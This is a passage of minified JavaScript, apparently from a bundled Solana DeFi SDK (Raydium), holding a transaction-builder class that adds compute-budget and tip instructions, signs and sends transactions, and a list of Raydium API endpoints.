V1bPMFQ3VYP6wDZ9bKStCFKx9A3tNbwZFC5ZGAN83MFK7XoTy+OmmcFEr6rLOjfSuTfPvHJkSVxW6Qllwkl67XcBi5v00u2gQsbu+38sp+rd5pA/LvyWj4P94ZGZwc1tE2P88xekCLcAwZGb+UhFzL/7K26csOb57yM5bvF9xJrLEObOkAAAAAn+HWRkdcPKyFFMnVwEoD7vnD0jCKFIU1sImubYCxNTSVzsKpaQX+fzNxrLAI3L14JQnJx/D6Uk2LADIHGqnGELzjEbkBDAlaM77NkXMPfqXNLSveCkWI7UEgNs31WEWB6XHSYI/v5DklHOb4QTtDOR804PVbi3fjloZeLR2F8d4FuZmMMO7ck3Fnkn2zEMG5gOmqsygb6PjTitArVl52NhcSznTxVnguaIJxiZkAnurDmn3MWR0PC2GLghp2KJqHCc6QQ85odeIjFHKOlRlJyeSXVJmL8vb1UgOzsbJPVP8p6zM4M3C1Sd7uWIHP33G42AP2Zg8ucn/n6meQjjD266JgCWdxZD6PXs9CsnIeL7SSG0/6lGb9xfP0ZcWkCXB/3hjxHYVXjra/GPOeXGk0fLLKjCbk+mgs2w6d2oCwimBipTzuoZ30GiI8ij8VRzD5CzMWtu2m21eDBIfjGAEo4pQeNNonKcqzV/cleX8ySZLOHsz8PtBCrLqF+VkLm9hOzIT+6i/nIf6keR4GWKMOD4AvqfpjHoD4DuhBpz8P28+DxkGrDXXr/nr20x291VPvcTU/b+b+o2kC9G0kcXeTlLjU6a2TQXWlZ4gBUdBl1jgT7mObSTpLblNiXZsLkbmVXZwvFKXua5cUKlWed/w30skmEUraTuQqtqr5fHZPW9n57EmeTif6LjHL2YJFZkQU+TrJmFzqzmF4/b8OwrPQAprl8mX3q4LUIdAS/a+11B6DWD1Xk2++Sn94dLC4xjkO4Wtlw8c4XuzciVbepHOmnoWzVu/0y3KCrLCSfQxQ3br8DJCoVzhgtPsS2nZZjsBGIZgnU0QpMv+2MnRsnKwdp1VsrCX84j/qvaZn4WhKunippgTbN2EUs0tPTP55Qfgj+nKmjtWW5IYs72FrEwJKYoNfsmqaF4o5pf4v9zgPwVwY/5I4XJKUL2L25m9kAQcW/K+H1RTFEUoj8Z4ajpOmAB/dG0COmCphVMW2CCMvnxhcGiSgPnpDuWu6qiJ7NG7ye5kvHgefgqPLeicspNJ5EpL3XiRNLM2tmJLI1awAwOyd6iHv0dCkMYRKaa6rcaZeYwmKCkckm0kM2JNmnmmAaBQQ7mwmIM0IMxX4f5W6j9PqZWcJxF7r17T/lQBAmcjoupRiJifbnXCNUv9GhpRF19WcBdeKbivRJVlGop6I2RS6lGImJ9udcI1S/0aGlEXX1ZwF14puK9ElWUainojZFYVHLHD6dIP2ESjqBzg3ol1/wB7+/ylGwd9LS7wSZ2A630CJSVKwH47K9P4bB8PEQP8BwjMFa7xQHOqZFP1XqaQ==",
            "base64"
          )
        ),
      }),
    },
    Z_ = 2e3,
    X_ = class {
      constructor(t) {
        (this.instructions = []),
          (this.endInstructions = []),
          (this.lookupTableAddress = []),
          (this.signers = []),
          (this.instructionTypes = []),
          (this.endInstructionTypes = []),
          (this.connection = t.connection),
          (this.feePayer = t.feePayer),
          (this.signAllTransactions = t.signAllTransactions),
          (this.owner = t.owner),
          (this.cluster = t.cluster),
          (this.blockhashCommitment = t.blockhashCommitment),
          (this.loopMultiTxStatus = !!t.loopMultiTxStatus);
      }
      get AllTxData() {
        return {
          instructions: this.instructions,
          endInstructions: this.endInstructions,
          signers: this.signers,
          instructionTypes: this.instructionTypes,
          endInstructionTypes: this.endInstructionTypes,
          lookupTableAddress: this.lookupTableAddress,
        };
      }
      get allInstructions() {
        return [...this.instructions, ...this.endInstructions];
      }
      async getComputeBudgetConfig() {
        var t;
        let e = (
            await tv.get(
              "https://solanacompass.com/api/fees?cacheFreshTime=300000"
            )
          ).data,
          { avg: n } = null != (t = null == e ? void 0 : e[15]) ? t : {};
        if (n)
          return {
            units: 6e5,
            microLamports: Math.min(Math.ceil((1e6 * n) / 6e5), 25e3),
          };
      }
      addCustomComputeBudget(t) {
        if (t) {
          let { instructions: e, instructionTypes: n } = u_(t);
          return (
            this.instructions.unshift(...e),
            this.instructionTypes.unshift(...n),
            !0
          );
        }
        return !1;
      }
      addTipInstruction(t) {
        var e;
        return (
          !!t &&
          (this.endInstructions.push(
            Gs.transfer({
              fromPubkey: null != (e = t.feePayer) ? e : this.feePayer,
              toPubkey: new Ji(t.address),
              lamports: BigInt(t.amount.toString()),
            })
          ),
          this.endInstructionTypes.push(s_),
          !0)
        );
      }
      async calComputeBudget({ config: t, defaultIns: e }) {
        try {
          let n = t || (await this.getComputeBudgetConfig());
          if (this.addCustomComputeBudget(n)) return;
          e && this.instructions.unshift(...e);
        } catch {
          e && this.instructions.unshift(...e);
        }
      }
      addInstruction({
        instructions: t = [],
        endInstructions: e = [],
        signers: n = [],
        instructionTypes: r = [],
        endInstructionTypes: o = [],
        lookupTableAddress: i = [],
      }) {
        return (
          this.instructions.push(...t),
          this.endInstructions.push(...e),
          this.signers.push(...n),
          this.instructionTypes.push(...r),
          this.endInstructionTypes.push(...o),
          this.lookupTableAddress.push(
            ...i.filter((t) => t !== Ji.default.toString())
          ),
          this
        );
      }
      async versionBuild({ txVersion: t, extInfo: e }) {
        return 0 === t ? await this.buildV0(SA({}, e || {})) : this.build(e);
      }
      build(t) {
        var e;
        let n = new As();
        return (
          this.allInstructions.length && n.add(...this.allInstructions),
          (n.feePayer = this.feePayer),
          (null == (e = this.owner) ? void 0 : e.signer) &&
            !this.signers.some((t) =>
              t.publicKey.equals(this.owner.publicKey)
            ) &&
            this.signers.push(this.owner.signer),
          {
            builder: this,
            transaction: n,
            signers: this.signers,
            instructionTypes: [
              ...this.instructionTypes,
              ...this.endInstructionTypes,
            ],
            execute: async (t) => {
              var e;
              let {
                  recentBlockHash: r,
                  skipPreflight: o = !0,
                  sendAndConfirm: i,
                  notSendToRpc: s,
                } = t || {},
                a =
                  null != r
                    ? r
                    : await c_(this.connection, this.blockhashCommitment);
              if (
                ((n.recentBlockhash = a),
                this.signers.length && n.sign(...this.signers),
                g_([n]),
                null != (e = this.owner) && e.isKeyPair)
              )
                return {
                  txId: i
                    ? await Ls(
                        this.connection,
                        n,
                        this.signers.find((t) =>
                          t.publicKey.equals(this.owner.publicKey)
                        )
                          ? this.signers
                          : [...this.signers, this.owner.signer],
                        { skipPreflight: o }
                      )
                    : await this.connection.sendRawTransaction(n.serialize(), {
                        skipPreflight: o,
                      }),
                  signedTx: n,
                };
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions([n]);
                if (this.signers.length)
                  for (let e of t)
                    try {
                      e.sign(...this.signers);
                    } catch {}
                return {
                  txId: s
                    ? ""
                    : await this.connection.sendRawTransaction(
                        t[0].serialize(),
                        { skipPreflight: o }
                      ),
                  signedTx: t[0],
                };
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: t || {},
          }
        );
      }
      buildMultiTx(t) {
        var e;
        let { extraPreBuildData: n = [], extInfo: r } = t,
          { transaction: o } = this.build(r),
          i = n.filter((t) => t.transaction.instructions.length > 0),
          s = [o, ...i.map((t) => t.transaction)],
          a = [this.signers, ...i.map((t) => t.signers)],
          u = [
            ...this.instructionTypes,
            ...i.map((t) => t.instructionTypes).flat(),
          ];
        return (
          null != (e = this.owner) &&
            e.signer &&
            a.forEach((t) => {
              t.some((t) => t.publicKey.equals(this.owner.publicKey)) ||
                this.signers.push(this.owner.signer);
            }),
          {
            builder: this,
            transactions: s,
            signers: a,
            instructionTypes: u,
            execute: async (t) => {
              var e;
              let {
                  sequentially: n,
                  onTxUpdate: r,
                  skipTxCount: o = 0,
                  recentBlockHash: i,
                  skipPreflight: u = !0,
                } = t || {},
                c =
                  null != i
                    ? i
                    : await c_(this.connection, this.blockhashCommitment);
              if (null != (e = this.owner) && e.isKeyPair) {
                if (n) {
                  let t = [],
                    e = 0;
                  for (let n of s) {
                    if ((++e, e <= o)) continue;
                    let r = await Ls(
                      this.connection,
                      n,
                      this.signers.find((t) =>
                        t.publicKey.equals(this.owner.publicKey)
                      )
                        ? this.signers
                        : [...this.signers, this.owner.signer],
                      { skipPreflight: u }
                    );
                    t.push(r);
                  }
                  return { txIds: t, signedTxs: s };
                }
                return {
                  txIds: await await Promise.all(
                    s.map(
                      async (t) => (
                        (t.recentBlockhash = c),
                        await this.connection.sendRawTransaction(
                          t.serialize(),
                          { skipPreflight: u }
                        )
                      )
                    )
                  ),
                  signedTxs: s,
                };
              }
              if (this.signAllTransactions) {
                let t = s.map(
                  (t, e) => (
                    (t.recentBlockhash = c), a[e].length && t.sign(...a[e]), t
                  )
                );
                g_(t);
                let e = await this.signAllTransactions(t);
                if (n) {
                  let t = 0,
                    n = [],
                    o = async () => {
                      if (!e[t]) return;
                      let i = await this.connection.sendRawTransaction(
                        e[t].serialize(),
                        { skipPreflight: u }
                      );
                      n.push({ txId: i, status: "sent", signedTx: e[t] }),
                        null == r || r([...n]),
                        t++;
                      let s = !1,
                        a = null,
                        c = null,
                        l = (t) => {
                          null !== a && clearInterval(a),
                            null !== c &&
                              this.connection.removeSignatureListener(c);
                          let e = n.findIndex((t) => t.txId === i);
                          if (e > -1) {
                            if (
                              "error" === n[e].status ||
                              "success" === n[e].status
                            )
                              return;
                            n[e].status = t.err ? "error" : "success";
                          }
                          null == r || r([...n]), t.err || o();
                        };
                      this.loopMultiTxStatus &&
                        (a = setInterval(async () => {
                          var t;
                          if (s) return clearInterval(a), void 0;
                          try {
                            let e = await this.connection.getTransaction(i, {
                              commitment: "confirmed",
                              maxSupportedTransactionVersion: 0,
                            });
                            e &&
                              ((s = !0),
                              clearInterval(a),
                              l({
                                err:
                                  (null == (t = e.meta) ? void 0 : t.err) ||
                                  null,
                              }),
                              void 0);
                          } catch (e) {
                            (s = !0), clearInterval(a), void 0;
                          }
                        }, Z_)),
                        (c = this.connection.onSignature(
                          i,
                          (t) => {
                            if (s)
                              return (
                                this.connection.removeSignatureListener(c),
                                void 0
                              );
                            (s = !0), l(t);
                          },
                          "confirmed"
                        )),
                        this.connection.getSignatureStatus(i);
                    };
                  return (
                    await o(), { txIds: n.map((t) => t.txId), signedTxs: e }
                  );
                }
                {
                  let t = [];
                  for (let n = 0; n < e.length; n += 1) {
                    let r = await this.connection.sendRawTransaction(
                      e[n].serialize(),
                      { skipPreflight: u }
                    );
                    t.push(r);
                  }
                  return { txIds: t, signedTxs: e };
                }
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: r || {},
          }
        );
      }
      async versionMultiBuild({
        extraPreBuildData: t,
        txVersion: e,
        extInfo: n,
      }) {
        return 0 === e
          ? await this.buildV0MultiTx({
              extraPreBuildData: t,
              buildProps: n || {},
            })
          : this.buildMultiTx({ extraPreBuildData: t, extInfo: n });
      }
      async buildV0(t) {
        var e;
        let n = t || {},
          {
            lookupTableCache: r = {},
            lookupTableAddress: o = [],
            forerunCreate: i,
            recentBlockhash: s,
          } = n,
          a = TA(n, [
            "lookupTableCache",
            "lookupTableAddress",
            "forerunCreate",
            "recentBlockhash",
          ]),
          u = SA(SA({}, "devnet" === this.cluster ? {} : H_), r),
          c = Array.from(new Set([...o, ...this.lookupTableAddress])),
          l = [];
        for (let m of c) void 0 === u[m] && l.push(new Ji(m));
        let d = await G_({ connection: this.connection, address: l });
        for (let [m, g] of Object.entries(d)) u[m] = g;
        let f = i
            ? Ji.default.toBase58()
            : null != s
            ? s
            : await c_(this.connection, this.blockhashCommitment),
          h = new ks({
            payerKey: this.feePayer,
            recentBlockhash: f,
            instructions: [...this.allInstructions],
          }).compileToV0Message(Object.values(u));
        (null == (e = this.owner) ? void 0 : e.signer) &&
          !this.signers.some((t) => t.publicKey.equals(this.owner.publicKey)) &&
          this.signers.push(this.owner.signer);
        let p = new Is(h);
        return (
          p.sign(this.signers),
          {
            builder: this,
            transaction: p,
            signers: this.signers,
            instructionTypes: [
              ...this.instructionTypes,
              ...this.endInstructionTypes,
            ],
            execute: async (t) => {
              var e;
              let {
                skipPreflight: n = !0,
                sendAndConfirm: r,
                notSendToRpc: o,
              } = t || {};
              if ((g_([p]), null != (e = this.owner) && e.isKeyPair)) {
                let t = await this.connection.sendTransaction(p, {
                  skipPreflight: n,
                });
                return (
                  r && (await l_(this.connection, t)), { txId: t, signedTx: p }
                );
              }
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions([p]);
                if (this.signers.length)
                  for (let e of t)
                    try {
                      e.sign(this.signers);
                    } catch {}
                return {
                  txId: o
                    ? ""
                    : await this.connection.sendTransaction(t[0], {
                        skipPreflight: n,
                      }),
                  signedTx: t[0],
                };
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: a || {},
          }
        );
      }
      async buildV0MultiTx(t) {
        var e;
        let { extraPreBuildData: n = [], buildProps: r } = t,
          { transaction: o } = await this.buildV0(r),
          i = n.filter((t) => t.builder.instructions.length > 0),
          s = [o, ...i.map((t) => t.transaction)],
          a = [this.signers, ...i.map((t) => t.signers)],
          u = [
            ...this.instructionTypes,
            ...i.map((t) => t.instructionTypes).flat(),
          ];
        return (
          null != (e = this.owner) &&
            e.signer &&
            a.forEach((t) => {
              t.some((t) => t.publicKey.equals(this.owner.publicKey)) ||
                this.signers.push(this.owner.signer);
            }),
          s.forEach(async (t, e) => {
            t.sign(a[e]);
          }),
          {
            builder: this,
            transactions: s,
            signers: a,
            instructionTypes: u,
            buildProps: r,
            execute: async (t) => {
              var e;
              let {
                sequentially: n,
                onTxUpdate: r,
                recentBlockHash: o,
                skipPreflight: i = !0,
              } = t || {};
              if (
                (o && s.forEach((t) => (t.message.recentBlockhash = o)),
                g_(s),
                null != (e = this.owner) && e.isKeyPair)
              ) {
                if (n) {
                  let t = [];
                  for (let e of s) {
                    let n = await this.connection.sendTransaction(e, {
                      skipPreflight: i,
                    });
                    await l_(this.connection, n), t.push(n);
                  }
                  return { txIds: t, signedTxs: s };
                }
                return {
                  txIds: await Promise.all(
                    s.map(
                      async (t) =>
                        await this.connection.sendTransaction(t, {
                          skipPreflight: i,
                        })
                    )
                  ),
                  signedTxs: s,
                };
              }
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions(s);
                if (n) {
                  let e = 0,
                    n = [],
                    o = async () => {
                      if (!t[e]) return;
                      let s = await this.connection.sendTransaction(t[e], {
                        skipPreflight: i,
                      });
                      n.push({ txId: s, status: "sent", signedTx: t[e] }),
                        null == r || r([...n]),
                        e++;
                      let a = !1,
                        u = null,
                        c = null,
                        l = (t) => {
                          null !== u && clearInterval(u),
                            null !== c &&
                              this.connection.removeSignatureListener(c);
                          let e = n.findIndex((t) => t.txId === s);
                          if (e > -1) {
                            if (
                              "error" === n[e].status ||
                              "success" === n[e].status
                            )
                              return;
                            n[e].status = t.err ? "error" : "success";
                          }
                          null == r || r([...n]), t.err || o();
                        };
                      this.loopMultiTxStatus &&
                        (u = setInterval(async () => {
                          var t;
                          if (a) return clearInterval(u), void 0;
                          try {
                            let e = await this.connection.getTransaction(s, {
                              commitment: "confirmed",
                              maxSupportedTransactionVersion: 0,
                            });
                            e &&
                              ((a = !0),
                              clearInterval(u),
                              l({
                                err:
                                  (null == (t = e.meta) ? void 0 : t.err) ||
                                  null,
                              }),
                              void 0);
                          } catch (e) {
                            (a = !0), clearInterval(u), void 0;
                          }
                        }, Z_)),
                        (c = this.connection.onSignature(
                          s,
                          (t) => {
                            if (a)
                              return (
                                this.connection.removeSignatureListener(c),
                                void 0
                              );
                            (a = !0), l(t);
                          },
                          "confirmed"
                        )),
                        this.connection.getSignatureStatus(s);
                    };
                  return o(), { txIds: [], signedTxs: t };
                }
                {
                  let e = [];
                  for (let n = 0; n < t.length; n += 1) {
                    let r = await this.connection.sendTransaction(t[n], {
                      skipPreflight: i,
                    });
                    e.push(r);
                  }
                  return { txIds: e, signedTxs: t };
                }
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: r || {},
          }
        );
      }
      async sizeCheckBuild(t) {
        var e;
        let n = t || {},
          { splitIns: r = [], computeBudgetConfig: o } = n,
          i = TA(n, ["splitIns", "computeBudgetConfig"]),
          s = o ? u_(o) : { instructions: [] },
          a = this.signers.reduce(
            (t, e) => _A(SA({}, t), { [e.publicKey.toBase58()]: e }),
            {}
          ),
          u = [],
          c = [],
          l = [],
          d = 0;
        if (
          (this.allInstructions.forEach((t) => {
            let e = [...l, t],
              n = o ? [...s.instructions, ...e] : e,
              i = [
                ...new Set(
                  e
                    .map((t) =>
                      t.keys
                        .filter((t) => t.isSigner)
                        .map((t) => t.pubkey.toString())
                    )
                    .flat()
                ).values(),
              ].map((t) => new Ji(t));
            if (
              t !== r[d] &&
              l.length < 12 &&
              (h_({ instructions: n, payer: this.feePayer, signers: i }) ||
                h_({ instructions: e, payer: this.feePayer, signers: i }))
            )
              l.push(t);
            else {
              if (0 === l.length) throw Error("item ins too big");
              (d += t === r[d] ? 1 : 0),
                h_({
                  instructions: o ? [...s.instructions, ...l] : [...l],
                  payer: this.feePayer,
                  signers: i,
                })
                  ? u.push(new As().add(...s.instructions, ...l))
                  : u.push(new As().add(...l)),
                c.push(
                  Array.from(
                    new Set(
                      l
                        .map((t) =>
                          t.keys
                            .filter((t) => t.isSigner)
                            .map((t) => t.pubkey.toString())
                        )
                        .flat()
                    )
                  )
                    .map((t) => a[t])
                    .filter((t) => void 0 !== t)
                ),
                (l = [t]);
            }
          }),
          l.length > 0)
        ) {
          let t = [
            ...new Set(
              l
                .map((t) =>
                  t.keys
                    .filter((t) => t.isSigner)
                    .map((t) => t.pubkey.toString())
                )
                .flat()
            ).values(),
          ]
            .map((t) => a[t])
            .filter((t) => void 0 !== t);
          h_({
            instructions: o ? [...s.instructions, ...l] : [...l],
            payer: this.feePayer,
            signers: t.map((t) => t.publicKey),
          })
            ? u.push(new As().add(...s.instructions, ...l))
            : u.push(new As().add(...l)),
            c.push(t);
        }
        return (
          u.forEach((t) => (t.feePayer = this.feePayer)),
          null != (e = this.owner) &&
            e.signer &&
            c.forEach((t) => {
              t.some((t) => t.publicKey.equals(this.owner.publicKey)) ||
                t.push(this.owner.signer);
            }),
          {
            builder: this,
            transactions: u,
            signers: c,
            instructionTypes: this.instructionTypes,
            execute: async (t) => {
              var e;
              let {
                  sequentially: n,
                  onTxUpdate: r,
                  skipTxCount: o = 0,
                  recentBlockHash: i,
                  skipPreflight: s = !0,
                } = t || {},
                a =
                  null != i
                    ? i
                    : await c_(this.connection, this.blockhashCommitment);
              if (
                (u.forEach(async (t, e) => {
                  (t.recentBlockhash = a), c[e].length && t.sign(...c[e]);
                }),
                g_(u),
                null != (e = this.owner) && e.isKeyPair)
              ) {
                if (n) {
                  let t = 0,
                    e = [];
                  for (let n of u) {
                    if ((++t, t <= o)) {
                      e.push("tx skipped");
                      continue;
                    }
                    let r = await Ls(
                      this.connection,
                      n,
                      this.signers.find((t) =>
                        t.publicKey.equals(this.owner.publicKey)
                      )
                        ? this.signers
                        : [...this.signers, this.owner.signer],
                      { skipPreflight: s }
                    );
                    e.push(r);
                  }
                  return { txIds: e, signedTxs: u };
                }
                return {
                  txIds: await Promise.all(
                    u.map(
                      async (t) =>
                        await this.connection.sendRawTransaction(
                          t.serialize(),
                          { skipPreflight: s }
                        )
                    )
                  ),
                  signedTxs: u,
                };
              }
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions(u.slice(o, u.length)),
                  e = [...u.slice(0, o), ...t];
                if (n) {
                  let t = 0,
                    n = [],
                    i = async () => {
                      if (!e[t]) return;
                      t < o &&
                        (n.push({
                          txId: "",
                          status: "success",
                          signedTx: e[t],
                        }),
                        null == r || r([...n]),
                        t++,
                        i());
                      let a = await this.connection.sendRawTransaction(
                        e[t].serialize(),
                        { skipPreflight: s }
                      );
                      n.push({ txId: a, status: "sent", signedTx: e[t] }),
                        null == r || r([...n]),
                        t++;
                      let u = !1,
                        c = null,
                        l = null,
                        d = (t) => {
                          null !== c && clearInterval(c),
                            null !== l &&
                              this.connection.removeSignatureListener(l);
                          let e = n.findIndex((t) => t.txId === a);
                          if (e > -1) {
                            if (
                              "error" === n[e].status ||
                              "success" === n[e].status
                            )
                              return;
                            n[e].status = t.err ? "error" : "success";
                          }
                          null == r || r([...n]), t.err || i();
                        };
                      this.loopMultiTxStatus &&
                        (c = setInterval(async () => {
                          var t;
                          if (u) return clearInterval(c), void 0;
                          try {
                            let e = await this.connection.getTransaction(a, {
                              commitment: "confirmed",
                              maxSupportedTransactionVersion: 0,
                            });
                            e &&
                              ((u = !0),
                              clearInterval(c),
                              d({
                                err:
                                  (null == (t = e.meta) ? void 0 : t.err) ||
                                  null,
                              }),
                              void 0);
                          } catch (e) {
                            (u = !0), clearInterval(c), void 0;
                          }
                        }, Z_)),
                        (l = this.connection.onSignature(
                          a,
                          (t) => {
                            if (u)
                              return (
                                this.connection.removeSignatureListener(l),
                                void 0
                              );
                            (u = !0), d(t);
                          },
                          "confirmed"
                        )),
                        this.connection.getSignatureStatus(a);
                    };
                  return (
                    await i(), { txIds: n.map((t) => t.txId), signedTxs: e }
                  );
                }
                {
                  let t = [];
                  for (let n = 0; n < e.length; n += 1) {
                    let r = await this.connection.sendRawTransaction(
                      e[n].serialize(),
                      { skipPreflight: s }
                    );
                    t.push(r);
                  }
                  return { txIds: t, signedTxs: e };
                }
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: i || {},
          }
        );
      }
      async sizeCheckBuildV0(t) {
        var e;
        let n = t || {},
          {
            computeBudgetConfig: r,
            splitIns: o = [],
            lookupTableCache: i = {},
            lookupTableAddress: s = [],
          } = n,
          a = TA(n, [
            "computeBudgetConfig",
            "splitIns",
            "lookupTableCache",
            "lookupTableAddress",
          ]),
          u = SA(SA({}, "devnet" === this.cluster ? {} : H_), i),
          c = Array.from(new Set([...this.lookupTableAddress, ...s])),
          l = [];
        for (let b of c) void 0 === u[b] && l.push(new Ji(b));
        let d = await G_({ connection: this.connection, address: l });
        for (let [b, v] of Object.entries(d)) u[b] = v;
        let f = r ? u_(r) : { instructions: [] },
          h = await c_(this.connection, this.blockhashCommitment),
          p = this.signers.reduce(
            (t, e) => _A(SA({}, t), { [e.publicKey.toBase58()]: e }),
            {}
          ),
          m = [],
          g = [],
          y = [],
          w = 0;
        if (
          (this.allInstructions.forEach((t) => {
            let e = [...y, t],
              n = r ? [...f.instructions, ...e] : e;
            if (
              t !== o[w] &&
              y.length < 12 &&
              (p_({
                instructions: n,
                payer: this.feePayer,
                lookupTableAddressAccount: u,
              }) ||
                p_({
                  instructions: e,
                  payer: this.feePayer,
                  lookupTableAddressAccount: u,
                }))
            )
              y.push(t);
            else {
              if (0 === y.length) throw Error("item ins too big");
              w += t === o[w] ? 1 : 0;
              for (let t of [...new Set(c)]) void 0 !== u[t] && u[t];
              if (
                r &&
                p_({
                  instructions: [...f.instructions, ...y],
                  payer: this.feePayer,
                  lookupTableAddressAccount: u,
                  recentBlockhash: h,
                })
              ) {
                let t = new ks({
                  payerKey: this.feePayer,
                  recentBlockhash: h,
                  instructions: [...f.instructions, ...y],
                }).compileToV0Message(Object.values(u));
                m.push(new Is(t));
              } else {
                let t = new ks({
                  payerKey: this.feePayer,
                  recentBlockhash: h,
                  instructions: [...y],
                }).compileToV0Message(Object.values(u));
                m.push(new Is(t));
              }
              g.push(
                Array.from(
                  new Set(
                    y
                      .map((t) =>
                        t.keys
                          .filter((t) => t.isSigner)
                          .map((t) => t.pubkey.toString())
                      )
                      .flat()
                  )
                )
                  .map((t) => p[t])
                  .filter((t) => void 0 !== t)
              ),
                (y = [t]);
            }
          }),
          y.length > 0)
        ) {
          let t = [
            ...new Set(
              y
                .map((t) =>
                  t.keys
                    .filter((t) => t.isSigner)
                    .map((t) => t.pubkey.toString())
                )
                .flat()
            ).values(),
          ]
            .map((t) => p[t])
            .filter((t) => void 0 !== t);
          if (
            r &&
            p_({
              instructions: [...f.instructions, ...y],
              payer: this.feePayer,
              lookupTableAddressAccount: u,
              recentBlockhash: h,
            })
          ) {
            let t = new ks({
              payerKey: this.feePayer,
              recentBlockhash: h,
              instructions: [...f.instructions, ...y],
            }).compileToV0Message(Object.values(u));
            m.push(new Is(t));
          } else {
            let t = new ks({
              payerKey: this.feePayer,
              recentBlockhash: h,
              instructions: [...y],
            }).compileToV0Message(Object.values(u));
            m.push(new Is(t));
          }
          g.push(t);
        }
        return (
          null != (e = this.owner) &&
            e.signer &&
            g.forEach((t) => {
              t.some((t) => t.publicKey.equals(this.owner.publicKey)) ||
                t.push(this.owner.signer);
            }),
          m.forEach((t, e) => {
            t.sign(g[e]);
          }),
          {
            builder: this,
            transactions: m,
            buildProps: t,
            signers: g,
            instructionTypes: this.instructionTypes,
            execute: async (t) => {
              var e;
              let {
                sequentially: n,
                onTxUpdate: r,
                skipTxCount: o = 0,
                recentBlockHash: i,
                skipPreflight: s = !0,
              } = t || {};
              if (
                (m.map(async (t, e) => {
                  g[e].length && t.sign(g[e]),
                    i && (t.message.recentBlockhash = i);
                }),
                g_(m),
                null != (e = this.owner) && e.isKeyPair)
              ) {
                if (n) {
                  let t = 0,
                    e = [];
                  for (let n of m) {
                    if ((++t, t <= o)) {
                      void 0, e.push("tx skipped");
                      continue;
                    }
                    let r = await this.connection.sendTransaction(n, {
                      skipPreflight: s,
                    });
                    await l_(this.connection, r), e.push(r);
                  }
                  return { txIds: e, signedTxs: m };
                }
                return {
                  txIds: await Promise.all(
                    m.map(
                      async (t) =>
                        await this.connection.sendTransaction(t, {
                          skipPreflight: s,
                        })
                    )
                  ),
                  signedTxs: m,
                };
              }
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions(m.slice(o, m.length)),
                  e = [...m.slice(0, o), ...t];
                if (n) {
                  let t = 0,
                    n = [],
                    i = async () => {
                      if (!e[t]) return;
                      if (t < o)
                        return (
                          n.push({
                            txId: "",
                            status: "success",
                            signedTx: e[t],
                          }),
                          null == r || r([...n]),
                          t++,
                          i(),
                          void 0
                        );
                      let a = await this.connection.sendTransaction(e[t], {
                        skipPreflight: s,
                      });
                      n.push({ txId: a, status: "sent", signedTx: e[t] }),
                        null == r || r([...n]),
                        t++;
                      let u = !1,
                        c = null,
                        l = null,
                        d = (t) => {
                          null !== c && clearInterval(c),
                            null !== l &&
                              this.connection.removeSignatureListener(l);
                          let e = n.findIndex((t) => t.txId === a);
                          if (e > -1) {
                            if (
                              "error" === n[e].status ||
                              "success" === n[e].status
                            )
                              return;
                            n[e].status = t.err ? "error" : "success";
                          }
                          null == r || r([...n]), t.err || i();
                        };
                      this.loopMultiTxStatus &&
                        (c = setInterval(async () => {
                          var t;
                          if (u) return clearInterval(c), void 0;
                          try {
                            let e = await this.connection.getTransaction(a, {
                              commitment: "confirmed",
                              maxSupportedTransactionVersion: 0,
                            });
                            e &&
                              ((u = !0),
                              clearInterval(c),
                              d({
                                err:
                                  (null == (t = e.meta) ? void 0 : t.err) ||
                                  null,
                              }),
                              void 0);
                          } catch (e) {
                            (u = !0), clearInterval(c), void 0;
                          }
                        }, Z_)),
                        (l = this.connection.onSignature(
                          a,
                          (t) => {
                            if (u)
                              return (
                                this.connection.removeSignatureListener(l),
                                void 0
                              );
                            (u = !0), d(t);
                          },
                          "confirmed"
                        )),
                        this.connection.getSignatureStatus(a);
                    };
                  return i(), { txIds: [], signedTxs: e };
                }
                {
                  let t = [];
                  for (let n = 0; n < e.length; n += 1) {
                    let r = await this.connection.sendTransaction(e[n], {
                      skipPreflight: s,
                    });
                    t.push(r);
                  }
                  return { txIds: t, signedTxs: e };
                }
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: a || {},
          }
        );
      }
    },
    J_ = new Yn(1e6),
    Y_ = ((t) => ((t.ALL = "all"), (t.Strict = "strict"), t))(Y_ || {}),
    Q_ =
      (((V_ = Q_ || {}).All = "all"),
      (V_.Standard = "standard"),
      (V_.Concentrated = "concentrated"),
      (V_.AllFarm = "allFarm"),
      (V_.StandardFarm = "standardFarm"),
      (V_.ConcentratedFarm = "concentratedFarm"),
      V_),
    $_ = {
      BASE_HOST: "https://api-v3.raydium.io",
      OWNER_BASE_HOST: "https://owner-v1.raydium.io",
      SERVICE_BASE_HOST: "https://service.raydium.io",
      MONITOR_BASE_HOST: "https://monitor.raydium.io",
      SERVICE_1_BASE_HOST: "https://service-v1.raydium.io",
      SEND_TRANSACTION: "/send-transaction",
      FARM_ARP: "/main/farm/info",
      FARM_ARP_LINE: "/main/farm-apr-tv",
      CLMM_CONFIG: "/main/clmm-config",
      CPMM_CONFIG: "/main/cpmm-config",
      VERSION: "/main/version",
      CHECK_AVAILABILITY: "/v3/main/AvailabilityCheckAPI",
      RPCS: "/main/rpcs",
      INFO: "/main/info",
      STAKE_POOLS: "/main/stake-pools",
      CHAIN_TIME: "/main/chain-time",
      TOKEN_LIST: "/mint/list",
      MINT_INFO_ID: "/mint/ids",
      JUP_TOKEN_LIST: "https://lite-api.jup.ag/tokens/v1/tagged/verified",
      POOL_LIST: "/pools/info/list",
      POOL_SEARCH_BY_ID: "/pools/info/ids",
      POOL_SEARCH_MINT: "/pools/info/mint",
      POOL_SEARCH_LP: "/pools/info/lps",
      POOL_KEY_BY_ID: "/pools/key/ids",
      POOL_LIQUIDITY_LINE: "/pools/line/liquidity",
      POOL_POSITION_LINE: "/pools/line/position",
      FARM_INFO: "/farms/info/ids",
      FARM_LP_INFO: "/farms/info/lp",
      FARM_KEYS: "/farms/key/ids",
      OWNER_CREATED_FARM: "/create-pool/{owner}",
      OWNER_IDO: "/main/ido/{owner}",
